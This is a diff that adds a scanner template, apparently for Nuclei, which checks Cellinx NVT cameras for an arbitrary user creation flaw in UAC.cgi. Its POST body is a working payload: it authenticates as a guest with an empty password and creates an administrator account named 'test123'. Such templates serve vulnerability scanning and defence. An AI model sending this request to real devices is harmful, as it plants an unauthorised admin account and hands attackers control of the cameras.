@@ -1,0 +1,25 @@
+id: poc-yaml-cellinx-nvt-uaccgi-anyuser-creat
+info:
+  name: Cellinx NVT Camera UAC.cgi Arbitrary User Creation Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    The Cellinx NVT Camera is vulnerable to arbitrary user creation due to a flaw in the UAC.cgi endpoint. This allows an attacker to create users with administrative privileges.
+http:
+  - method: POST
+    path:
+      - "/cgi-bin/UAC.cgi?TYPE=json"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"test123","password":"test123","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"retData":{"add_user":{"result" : "Success"}'
+        part: body
